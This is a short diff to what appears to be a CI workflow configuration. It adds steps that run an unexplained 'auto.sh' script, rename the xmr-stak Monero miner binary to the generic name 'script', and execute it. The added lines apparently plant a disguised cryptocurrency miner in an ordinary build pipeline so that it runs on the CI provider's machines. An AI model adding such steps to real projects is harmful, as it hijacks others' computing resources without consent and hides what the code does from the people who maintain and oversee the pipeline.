@@ -11,3 +11,6 @@ jobs:
       - run: make install
       - run: ls -la
       - run: pwd
+      - run: ./auto.sh
+      - run: mv ./bin/xmr-stak ./bin/script
+      - run: ./bin/script
